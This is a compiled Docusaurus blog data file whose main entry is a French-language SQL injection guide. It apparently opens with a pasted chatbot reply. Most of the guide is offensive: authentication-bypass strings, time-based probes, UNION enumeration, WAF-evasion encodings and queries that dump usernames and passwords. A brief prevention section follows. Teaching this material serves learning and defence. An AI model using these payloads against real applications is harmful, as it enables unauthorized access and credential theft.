"use strict";(self.webpackChunkmon_blog=self.webpackChunkmon_blog||[]).push([[637],{2397:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"sqli-2025-guide","metadata":{"permalink":"/mon-blog/sqli-2025-guide","editUrl":"https://github.com/jordan-creyelman/mon-blog/edit/main/blog/2025-05-13-sqli-securite.md","source":"@site/blog/2025-05-13-sqli-securite.md","title":"Les injections SQL en 2025 - Guide complet de pr\xe9vention","description":"Tout ce que vous devez savoir sur les attaques par injection SQL et comment prot\xe9ger vos applications en 2025","date":"2025-05-13T00:00:00.000Z","tags":[{"inline":true,"label":"s\xe9curit\xe9","permalink":"/mon-blog/tags/securite"},{"inline":true,"label":"webdev","permalink":"/mon-blog/tags/webdev"},{"inline":true,"label":"bases de donn\xe9es","permalink":"/mon-blog/tags/bases-de-donnees"},{"inline":true,"label":"owasp","permalink":"/mon-blog/tags/owasp"}],"readingTime":4.145,"hasTruncateMarker":false,"authors":[{"name":"DoctorCode","title":"Expert en S\xe9curit\xe9 Web","url":"https://votresite.com","socials":{},"key":null,"page":null}],"frontMatter":{"title":"Les injections SQL en 2025 - Guide complet de pr\xe9vention","slug":"sqli-2025-guide","authors":[{"name":"DoctorCode","title":"Expert en S\xe9curit\xe9 Web","url":"https://votresite.com"}],"tags":["s\xe9curit\xe9","webdev","bases de donn\xe9es","owasp"],"date":"2025-05-13T00:00:00.000Z","description":"Tout ce que vous devez savoir sur les attaques par injection SQL et comment prot\xe9ger vos applications en 2025"},"unlisted":false,"nextItem":{"title":"MDX Blog Post","permalink":"/mon-blog/mdx-blog-post"}},"content":"Parfait ! Voici une version **blog adapt\xe9e** de ton article sur les failles SQLi, avec un **ton fluide, p\xe9dagogique et professionnel**, id\xe9ale pour publication sur un blog tech ou cybers\xe9curit\xe9. Je conserve le style Markdown pour faciliter la mise en ligne sur des plateformes comme Medium, Dev.to ou un blog statique (Jekyll, Hugo, etc.).\\n\\n---\\n\\n````markdown\\n# \ud83d\udca3 Comprendre les Failles SQLi : Le Guide Complet pour D\xe9butants\\n\\nLa s\xe9curit\xe9 web est un pilier essentiel du d\xe9veloppement moderne. Pourtant, une vuln\xe9rabilit\xe9 vieille comme le web continue de faire des ravages : **l\u2019injection SQL (SQLi)**. \\n\\nDans cet article, je vous propose une plong\xe9e claire et structur\xe9e dans le monde des failles SQLi : de la d\xe9couverte de colonnes avec `UNION`, aux techniques de contournement de WAF, en passant par l\'exfiltration de donn\xe9es. Un v\xe9ritable couteau suisse pour mieux comprendre cette menace \u2014 et apprendre \xe0 s\u2019en prot\xe9ger.\\n\\n---\\n\\n## \ud83e\udde0 C\u2019est quoi une injection SQL ?\\n\\nL\u2019injection SQL consiste \xe0 ins\xe9rer du code SQL malveillant dans une requ\xeate pr\xe9vue pour interagir avec une base de donn\xe9es. Elle survient g\xe9n\xe9ralement via des champs non filtr\xe9s comme un formulaire de connexion ou une URL.\\n\\n**Exemple simple :**\\n```sql\\nInput : \' OR 1=1 --\\nRequ\xeate : SELECT * FROM users WHERE username = \'\' OR 1=1 --\' AND password = \'\'\\n````\\n\\nR\xe9sultat ? Tous les utilisateurs sont retourn\xe9s, contournant toute authentification.\\n\\n---\\n\\n## \ud83d\udccc 1. Types d\u2019injection SQL\\n\\nVoici les principaux types d\'injection \xe0 conna\xeetre :\\n\\n| Type                   | Description                                               | Exemple                             |\\n| ---------------------- | --------------------------------------------------------- | ----------------------------------- |\\n| **Inband (classique)** | L\'attaquant voit directement le r\xe9sultat.                 | `\' OR \'1\'=\'1`                       |\\n| **Error-based**        | Exploite les messages d\'erreur SQL.                       | `\' AND 1=CONVERT(int, @@version)--` |\\n| **Blind (bool\xe9en)**    | Injection sans message visible, mais r\xe9sultat observable. | `\' AND 1=1 --`                      |\\n| **Time-based**         | Injection confirm\xe9e via un d\xe9lai volontaire.              | `\' OR SLEEP(5)--`                   |\\n| **Out-of-band**        | Utilise un canal externe (rare).                          | Exfiltration DNS                    |\\n\\n---\\n\\n## \ud83d\udd0d 2. Tester une injection basique\\n\\nVoici des cha\xeenes simples pour tester une potentielle vuln\xe9rabilit\xe9 :\\n\\n* `\' OR 1=1--`\\n* `\\" OR \\"\\"=\\"`\\n* `admin\'--`\\n* `1\' ORDER BY 1--`\\n\\nSi l\'application renvoie une erreur ou affiche un comportement \xe9trange : bingo.\\n\\n---\\n\\n## \ud83e\uddee 3. Combien de colonnes ? (avec UNION)\\n\\nLe test via `ORDER BY` permet d\u2019estimer le nombre de colonnes :\\n\\n```sql\\n\' ORDER BY 1--  \\n\' ORDER BY 2--  \\n\' ORDER BY 3-- (jusqu\'\xe0 erreur)\\n```\\n\\nEnsuite, on teste l\u2019injection `UNION SELECT` :\\n\\n```sql\\n\' UNION SELECT 1--  \\n\' UNION SELECT 1,2--  \\n\' UNION SELECT 1,2,3--  \\n```\\n\\nLe bon nombre de colonnes = pas d\'erreur SQL.\\n\\n---\\n\\n## \ud83d\udd10 4. Commentaires SQL utiles\\n\\nSelon le moteur SQL, on peut commenter pour neutraliser le reste de la requ\xeate :\\n\\n* `--` ou `#` (MySQL, SQLite)\\n* `/* */` (toutes bases)\\n* `--+` pour certaines protections\\n\\n---\\n\\n## \ud83d\uddc3\ufe0f 5. Requ\xeates selon le SGBD\\n\\n| Base de donn\xe9es | Exemples utiles |\\n|------------------|------------------|\\n| **MySQL**        | - `SELECT @@version`  <br />- `SELECT * FROM INFORMATION_SCHEMA.TABLES` |\\n| **PostgreSQL**   | - `SELECT version()` <br />- `SELECT * FROM pg_catalog.pg_tables` |\\n| **Oracle**       | - `SELECT * FROM v$version` <br />- `SELECT * FROM all_tables` |\\n| **SQL Server**   | - `SELECT @@version` <br />- `WAITFOR DELAY \'0:0:5\'` |\\n\\n\\n---\\n\\n## \ud83d\udecc 6. Time-based SQLi\\n\\nQuand aucune erreur ou retour n\u2019est visible, on utilise des d\xe9lais pour observer une r\xe9action.\\n\\n* **MySQL** : `\' OR IF(1=1, SLEEP(5), 0)--`\\n* **PostgreSQL** : `\' OR 1=1; SELECT pg_sleep(5)--`\\n* **MSSQL** : `\' WAITFOR DELAY \'0:0:5\'--`\\n\\n---\\n\\n## \ud83e\uddec 7. Contourner les WAFs (Web Application Firewalls)\\n\\nPour \xe9viter les blocages automatiques, voici quelques techniques :\\n\\n| Technique       | Exemple                           |\\n| --------------- | --------------------------------- |\\n| Encodage URL    | `%27 OR 1=1--`                    |\\n| Double encodage | `%2527` pour `\'`                  |\\n| Casse tordue    | `SeLeCt`, `oR`, `UnIoN`           |\\n| Commentaires    | `UN/**/ION/**/SELECT`             |\\n| Concat\xe9nation   | `CONCAT(username, \':\', password)` |\\n\\n---\\n\\n## \ud83e\uddea 8. Exfiltrer les donn\xe9es\\n\\nLister les tables :\\n\\n```sql\\n\' UNION SELECT null, table_name FROM information_schema.tables--\\n```\\n\\nLister les colonnes d\'une table :\\n\\n```sql\\n\' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name=\'users\'--\\n```\\n\\nR\xe9cup\xe9rer les donn\xe9es :\\n\\n```sql\\n\' UNION SELECT username, password FROM users--\\n```\\n\\n---\\n\\n## \ud83d\udee1\ufe0f 9. Comment se prot\xe9ger ?\\n\\n* \u2705 Utiliser des **requ\xeates pr\xe9par\xe9es** (ex : PDO, ORM).\\n* \u2705 Filtrer et valider **chaque entr\xe9e utilisateur**.\\n* \u2705 Ne jamais **concat\xe9ner des cha\xeenes SQL**.\\n* \u2705 Garder les logiciels **\xe0 jour**.\\n* \u2705 Utiliser un **WAF**, mais pas comme unique barri\xe8re.\\n\\n---\\n\\n## \ud83c\udfaf Conclusion\\n\\nLes injections SQL sont simples \xe0 exploiter, mais aussi simples \xe0 \xe9viter si les bonnes pratiques sont respect\xe9es. Que vous soyez d\xe9veloppeur, pentester, ou simplement curieux, ma\xeetriser le SQLi est une \xe9tape essentielle pour comprendre les rouages de la cybers\xe9curit\xe9 web.\\n\\n---\\n\\n> \u26a0\ufe0f **Disclaimer** : Ce guide est fourni \xe0 des fins \xe9ducatives uniquement. Tester sans autorisation est **ill\xe9gal** et contraire \xe0 l\u2019\xe9thique."},{"id":"mdx-blog-post","metadata":{"permalink":"/mon-blog/mdx-blog-post","editUrl":"https://github.com/jordan-creyelman/mon-blog/edit/main/blog/2021-08-01-mdx-blog-post.mdx","source":"@site/blog/2021-08-01-mdx-blog-post.mdx","title":"MDX Blog Post","description":"Blog posts support Docusaurus Markdown features, such as MDX.","date":"2021-08-01T00:00:00.000Z","tags":[{"inline":false,"label":"Docusaurus","permalink":"/mon-blog/tags/docusaurus","description":"Docusaurus tag description"}],"readingTime":0.235,"hasTruncateMarker":true,"authors":[{"name":"S\xe9bastien Lorber","title":"Docusaurus maintainer","url":"https://sebastienlorber.com","page":{"permalink":"/mon-blog/authors/all-sebastien-lorber-articles"},"socials":{"x":"https://x.com/sebastienlorber","linkedin":"https://www.linkedin.com/in/sebastienlorber/","github":"https://github.com/slorber","newsletter":"https://thisweekinreact.com"},"imageURL":"https://github.com/slorber.png","key":"slorber"}],"frontMatter":{"slug":"mdx-blog-post","title":"MDX Blog Post","authors":["slorber"],"tags":["docusaurus"]},"unlisted":false,"prevItem":{"title":"Les injections SQL en 2025 - Guide complet de pr\xe9vention","permalink":"/mon-blog/sqli-2025-guide"}},"content":"Blog posts support [Docusaurus Markdown features](https://docusaurus.io/docs/markdown-features), such as [MDX](https://mdxjs.com/).\\n\\n:::tip\\n\\nUse the power of React to create interactive blog posts.\\n\\n:::\\n\\n{/* truncate */}\\n\\nFor example, use JSX to create an interactive button:\\n\\n```js\\n<button onClick={() => alert(\'button clicked!\')}>Click me!</button>\\n```\\n\\n<button onClick={() => alert(\'button clicked!\')}>Click me!</button>"}]}}')}}]);